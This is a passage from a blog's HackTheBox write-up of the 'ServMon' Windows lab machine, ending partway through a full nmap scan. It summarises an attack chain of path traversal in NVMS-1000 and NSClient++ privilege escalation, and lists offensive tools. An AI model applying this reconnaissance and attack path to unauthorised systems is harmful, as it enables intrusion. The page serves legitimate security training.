<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>ServMon | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,windows,easy"><meta name=description content="ServMon HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/servmon/><link crossorigin=anonymous href=/assets/css/stylesheet.35b906a90813b2766df33de5f84bf4610918496b745304c45e387646ed743bea.css integrity="sha256-NbkGqQgTsnZt8z3l+Ev0YQkYSWt0UwTEXjh2Ru10O+o=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/servmon/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="ServMon "><meta property="og:description" content="ServMon HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/servmon/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/servmon/servmon.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-06-20T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/servmon/servmon.png"><meta name=twitter:title content="ServMon "><meta name=twitter:description content="ServMon HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"ServMon ","item":"https://s4ch.github.io/writeups/hackthebox/servmon/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"ServMon ","name":"ServMon ","description":"ServMon HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","windows","easy"],"articleBody":"≡ƒÆó Info Name: ServMon Profile: www.hackthebox.eu Difficulty: Easy OS: Windows Points: 20 Overview TL;DR: We have to find some hints in a FTP, finds creds through a Path Traversal in NVMS-1000 and gain a low privilege shell, then we pe via NSClient++ to get admin RCE.\nInstall tools used in this WU on BlackArch Linux:\n1 $ sudo pacman -S nmap\texploitdb smbclient filezilla dos2unix curl metasploit Network Enumeration Let’s start with a nmap scan to find open ports and identify services:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 $ sudo nmap -sSVC -p- 10.10.10.184 -oA nmap_full Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-11 15:56 CEST Nmap scan report for 10.10.10.184 Host is up (0.020s latency). Not shown: 65517 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_01-18-20 12:05PM Users | ftp-syst: |_ SYST: Windows_NT 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA) | 256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA) |_ 256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519) 80/tcp open http | fingerprint-strings: | GetRequest, HTTPOptions, RTSPRequest: | HTTP/1.1 200 OK | Content-type: text/html | Content-Length: 340 | Connection: close | AuthInfo: | \u003c!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"\u003e | | | | | | | | | NULL: | HTTP/1.1 408 Request Timeout | Content-type: text/html | Content-Length: 0 | Connection: close |_ AuthInfo: |_http-title: Site doesn't have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 5040/tcp open unknown 5666/tcp open tcpwrapped 6063/tcp open x11? 6699/tcp open napster? 8443/tcp open ssl/https-alt | fingerprint-strings: | FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: | HTTP/1.1 404 | Content-Length: 18 | Document not found | GetRequest: | HTTP/1.1 302 | Content-Length: 0 | Location: /index.html | workers | jobs | submitted | errors | threads |_ ini\"}}]} | ssl-cert: Subject: commonName=localhost | Not valid before: 2020-01-14T13:24:20 |_Not valid after: 2021-01-13T13:24:20 |_ssl-date: TLS randomness does not represent time 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port80-TCP:V=7.80%I=7%D=6/11%Time=5EE2385B%P=x86_64-unknown-linux-gnu%r SF:(NULL,6B,\"HTTP/1\\.1\\x20408\\x20Request\\x20Timeout\\r\\nContent-type:\\x20te SF:xt/html\\r\\nContent-Length:\\x200\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x2 SF:0\\r\\n\\r\\n\")%r(GetRequest,1B4,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-type:\\x SF:20text/html\\r\\nContent-Length:\\x20340\\r\\nConnection:\\x20close\\r\\nAuthIn SF:fo:\\x20\\r\\n\\r\\n\\xef\\xbb\\xbf\u003c!DOCTYPE\\x20html\\x20PUBLIC\\x20\\\"-//W3C//DTD SF:\\x20XHTML\\x201\\.0\\x20Transitional//EN\\\"\\x20\\\"http://www\\.w3\\.org/TR/xht SF:ml1/DTD/xhtml1-transitional\\.dtd\\\"\u003e\\r\\n\\r\\n","wordCount":"2950","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/servmon/servmon.png","datePublished":"2020-06-20T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/servmon/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">ServMon</h1><div class=post-description>ServMon HackTheBox writeup</div><div class=post-meta><span title='2020-06-20 00:00:00 +0000 UTC'>June 20, 2020</span>&nbsp;·&nbsp;14 min&nbsp;·&nbsp;2950 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/windows/ class=post-tag title=windows>windows</a>
,
<a href=https://s4ch.github.io/tags/easy/ class=post-tag title=easy>easy</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/servmon/servmon.png alt="ServMon HackTheBox Machine"><p>ServMon - Easy Windows Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#ƒæó-info>≡ƒÆó Info</a></li></ul><ul><li><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network Enumeration</a></li><li><a href=#network-reconnaissance-ftp>Network reconnaissance: FTP</a></li><li><a href=#network-reconnaissance-http>Network reconnaissance: HTTP</a></li><li><a href=#network-reconnaissance-smb>Network reconnaissance: SMB</a></li><li><a href=#network-reconnaissance-ftp-lets-go-back>Network reconnaissance: FTP (let&rsquo;s go back)</a></li><li><a href=#network-reconnaissance-http-lets-go-back>Network reconnaissance: HTTP (let&rsquo;s go back)</a></li><li><a href=#network-exploitation-ssh>Network exploitation: SSH</a></li><li><a href=#privilege-escalation--through-nsclient-nadine-to-nt-authoritysystem>Privilege Escalation through NSClient++: Nadine to NT Authority\SYSTEM</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=ƒæó-info>≡ƒÆó Info<a hidden class=anchor aria-hidden=true href=#ƒæó-info>#</a></h2><h1></h1><ul><li><strong>Name:</strong> ServMon</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/240>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Windows</li><li><strong>Points:</strong> 20</li></ul><h1></h1><h3 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h3><p><strong>TL;DR</strong>: We have to find some hints in a FTP, finds creds through a Path
Traversal in NVMS-1000 and gain a low privilege shell, then we pe via
NSClient++ to get admin RCE.</p><p>Install tools used in this WU on BlackArch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo pacman -S nmap	exploitdb smbclient filezilla dos2unix curl metasploit
</span></span></code></pre></td></tr></table></div></div><h3 id=network-enumeration>Network Enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h3><p>Let&rsquo;s start with a <a href=https://nmap.org/>nmap</a> scan to find open ports and identify services:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo nmap -sSVC -p- 10.10.10.184 -oA nmap_full
</span></span><span class=line><span class=cl>Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-11 15:56 CEST
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.184
</span></span><span class=line><span class=cl>Host is up (0.020s latency).
</span></span><span class=line><span class=cl>Not shown: 65517 closed ports
</span></span><span class=line><span class=cl>PORT      STATE SERVICE       VERSION
</span></span><span class=line><span class=cl>21/tcp    open  ftp           Microsoft ftpd
</span></span><span class=line><span class=cl>| ftp-anon: Anonymous FTP login allowed (FTP code 230)
</span></span><span class=line><span class=cl>|_01-18-20  12:05PM       &lt;DIR&gt;          Users
</span></span><span class=line><span class=cl>| ftp-syst:
</span></span><span class=line><span class=cl>|_  SYST: Windows_NT
</span></span><span class=line><span class=cl>22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
</span></span><span class=line><span class=cl>| ssh-hostkey:
</span></span><span class=line><span class=cl>|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
</span></span><span class=line><span class=cl>|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
</span></span><span class=line><span class=cl>|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
</span></span><span class=line><span class=cl>80/tcp    open  http
</span></span><span class=line><span class=cl>| fingerprint-strings:
</span></span><span class=line><span class=cl>|   GetRequest, HTTPOptions, RTSPRequest:
</span></span><span class=line><span class=cl>|     HTTP/1.1 200 OK
</span></span><span class=line><span class=cl>|     Content-type: text/html
</span></span><span class=line><span class=cl>|     Content-Length: 340
</span></span><span class=line><span class=cl>|     Connection: close
</span></span><span class=line><span class=cl>|     AuthInfo:
</span></span><span class=line><span class=cl>|     &lt;!DOCTYPE html PUBLIC &#34;-//W3C//DTD XHTML 1.0 Transitional//EN&#34; &#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&#34;&gt;
</span></span><span class=line><span class=cl>|     &lt;html xmlns=&#34;http://www.w3.org/1999/xhtml&#34;&gt;
</span></span><span class=line><span class=cl>|     &lt;head&gt;
</span></span><span class=line><span class=cl>|     &lt;title&gt;&lt;/title&gt;
</span></span><span class=line><span class=cl>|     &lt;script type=&#34;text/javascript&#34;&gt;
</span></span><span class=line><span class=cl>|     window.location.href = &#34;Pages/login.htm&#34;;
</span></span><span class=line><span class=cl>|     &lt;/script&gt;
</span></span><span class=line><span class=cl>|     &lt;/head&gt;
</span></span><span class=line><span class=cl>|     &lt;body&gt;
</span></span><span class=line><span class=cl>|     &lt;/body&gt;
</span></span><span class=line><span class=cl>|     &lt;/html&gt;
</span></span><span class=line><span class=cl>|   NULL:
</span></span><span class=line><span class=cl>|     HTTP/1.1 408 Request Timeout
</span></span><span class=line><span class=cl>|     Content-type: text/html
</span></span><span class=line><span class=cl>|     Content-Length: 0
</span></span><span class=line><span class=cl>|     Connection: close
</span></span><span class=line><span class=cl>|_    AuthInfo:
</span></span><span class=line><span class=cl>|_http-title: Site doesn&#39;t have a title (text/html).
</span></span><span class=line><span class=cl>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds?
</span></span><span class=line><span class=cl>5040/tcp  open  unknown
</span></span><span class=line><span class=cl>5666/tcp  open  tcpwrapped
</span></span><span class=line><span class=cl>6063/tcp  open  x11?
</span></span><span class=line><span class=cl>6699/tcp  open  napster?
</span></span><span class=line><span class=cl>8443/tcp  open  ssl/https-alt
</span></span><span class=line><span class=cl>| fingerprint-strings:
</span></span><span class=line><span class=cl>|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:
</span></span><span class=line><span class=cl>|     HTTP/1.1 404
</span></span><span class=line><span class=cl>|     Content-Length: 18
</span></span><span class=line><span class=cl>|     Document not found
</span></span><span class=line><span class=cl>|   GetRequest:
</span></span><span class=line><span class=cl>|     HTTP/1.1 302
</span></span><span class=line><span class=cl>|     Content-Length: 0
</span></span><span class=line><span class=cl>|     Location: /index.html
</span></span><span class=line><span class=cl>|     workers
</span></span><span class=line><span class=cl>|     jobs
</span></span><span class=line><span class=cl>|     submitted
</span></span><span class=line><span class=cl>|     errors
</span></span><span class=line><span class=cl>|     threads
</span></span><span class=line><span class=cl>|_    ini&#34;}}]}
</span></span><span class=line><span class=cl>| ssl-cert: Subject: commonName=localhost
</span></span><span class=line><span class=cl>| Not valid before: 2020-01-14T13:24:20
</span></span><span class=line><span class=cl>|_Not valid after:  2021-01-13T13:24:20
</span></span><span class=line><span class=cl>|_ssl-date: TLS randomness does not represent time
</span></span><span class=line><span class=cl>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49665/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49666/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49668/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49669/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49670/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class=line><span class=cl>==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
</span></span><span class=line><span class=cl>SF-Port80-TCP:V=7.80%I=7%D=6/11%Time=5EE2385B%P=x86_64-unknown-linux-gnu%r
</span></span><span class=line><span class=cl>SF:(NULL,6B,&#34;HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20te
</span></span><span class=line><span class=cl>SF:xt/html\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x2
</span></span><span class=line><span class=cl>SF:0\r\n\r\n&#34;)%r(GetRequest,1B4,&#34;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x
</span></span><span class=line><span class=cl>SF:20text/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthIn
</span></span><span class=line><span class=cl>SF:fo:\x20\r\n\r\n\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\&#34;-//W3C//DTD
</span></span><span class=line><span class=cl>SF:\x20XHTML\x201\.0\x20Transitional//EN\&#34;\x20\&#34;http://www\.w3\.org/TR/xht
</span></span><span class=line><span class=cl>SF:ml1/DTD/xhtml1-transitional\.dtd\&#34;&gt;\r\n\r\n&lt;html\x20xmlns=\&#34;http://www\
</span></span><span class=line><span class=cl>SF:.w3\.org/1999/xhtml\&#34;&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n
</span></span><span class=line><span class=cl>SF:\x20\x20\x20\x20&lt;script\x20type=\&#34;text/javascript\&#34;&gt;\r\n\x20\x20\x20\x2
</span></span><span class=line><span class=cl>SF:0\x20\x20\x20\x20window\.location\.href\x20=\x20\&#34;Pages/login\.htm\&#34;;\r
</span></span><span class=line><span class=cl>SF:\n\x20\x20\x20\x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\
</span></span><span class=line><span class=cl>SF:r\n&#34;)%r(HTTPOptions,1B4,&#34;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
</span></span><span class=line><span class=cl>SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
</span></span><span class=line><span class=cl>SF:20\r\n\r\n\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\&#34;-//W3C//DTD\x20X
</span></span><span class=line><span class=cl>SF:HTML\x201\.0\x20Transitional//EN\&#34;\x20\&#34;http://www\.w3\.org/TR/xhtml1/D
</span></span><span class=line><span class=cl>SF:TD/xhtml1-transitional\.dtd\&#34;&gt;\r\n\r\n&lt;html\x20xmlns=\&#34;http://www\.w3\.
</span></span><span class=line><span class=cl>SF:org/1999/xhtml\&#34;&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n\x20\
</span></span><span class=line><span class=cl>SF:x20\x20\x20&lt;script\x20type=\&#34;text/javascript\&#34;&gt;\r\n\x20\x20\x20\x20\x20
</span></span><span class=line><span class=cl>SF:\x20\x20\x20window\.location\.href\x20=\x20\&#34;Pages/login\.htm\&#34;;\r\n\x2
</span></span><span class=line><span class=cl>SF:0\x20\x20\x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n&#34;)
</span></span><span class=line><span class=cl>SF:%r(RTSPRequest,1B4,&#34;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
</span></span><span class=line><span class=cl>SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
</span></span><span class=line><span class=cl>SF:n\r\n\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\&#34;-//W3C//DTD\x20XHTML\
</span></span><span class=line><span class=cl>SF:x201\.0\x20Transitional//EN\&#34;\x20\&#34;http://www\.w3\.org/TR/xhtml1/DTD/xh
</span></span><span class=line><span class=cl>SF:tml1-transitional\.dtd\&#34;&gt;\r\n\r\n&lt;html\x20xmlns=\&#34;http://www\.w3\.org/1
</span></span><span class=line><span class=cl>SF:999/xhtml\&#34;&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n\x20\x20\x
</span></span><span class=line><span class=cl>SF:20\x20&lt;script\x20type=\&#34;text/javascript\&#34;&gt;\r\n\x20\x20\x20\x20\x20\x20\
</span></span><span class=line><span class=cl>SF:x20\x20window\.location\.href\x20=\x20\&#34;Pages/login\.htm\&#34;;\r\n\x20\x20
</span></span><span class=line><span class=cl>SF:\x20\x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n&#34;);
</span></span><span class=line><span class=cl>==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
</span></span><span class=line><span class=cl>SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=6/11%Time=5EE23864%P=x86_64-unknown-lin
</span></span><span class=line><span class=cl>SF:ux-gnu%r(GetRequest,AE,&#34;HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLoc
</span></span><span class=line><span class=cl>SF:ation:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
</span></span><span class=line><span class=cl>SF:0\0\0\0\0\0\0\0\0\x12\x02\x18\0\x1aE\n\x07workers\x12\x0b\n\x04jobs\x12
</span></span><span class=line><span class=cl>SF:\x03\x18\xc0\x03\x12\x10\n\tsubmitted\x12\x03\x18\xbf\x03\x12\x0c\n\x06
</span></span><span class=line><span class=cl>SF:errors\x12\x02\x18\0\x12\r\n\x07threads\x12\x02\x18\x01\0ini\&#34;}}\]}\0\0
</span></span><span class=line><span class=cl>SF:\0&#34;)%r(HTTPOptions,36,&#34;HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\
</span></span><span class=line><span class=cl>SF:nDocument\x20not\x20found&#34;)%r(FourOhFourRequest,36,&#34;HTTP/1\.1\x20404\r\
</span></span><span class=line><span class=cl>SF:nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found&#34;)%r(RTSPRequest,
</span></span><span class=line><span class=cl>SF:36,&#34;HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x2
</span></span><span class=line><span class=cl>SF:0found&#34;)%r(SIPOptions,36,&#34;HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n
</span></span><span class=line><span class=cl>SF:\r\nDocument\x20not\x20found&#34;);
</span></span><span class=line><span class=cl>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl>|_clock-skew: 4m15s
</span></span><span class=line><span class=cl>| smb2-security-mode:
</span></span><span class=line><span class=cl>|   2.02:
</span></span><span class=line><span class=cl>|_    Message signing enabled but not required
</span></span><span class=line><span class=cl>| smb2-time:
</span></span><span class=line><span class=cl>|   date: 2020-06-11T14:04:39
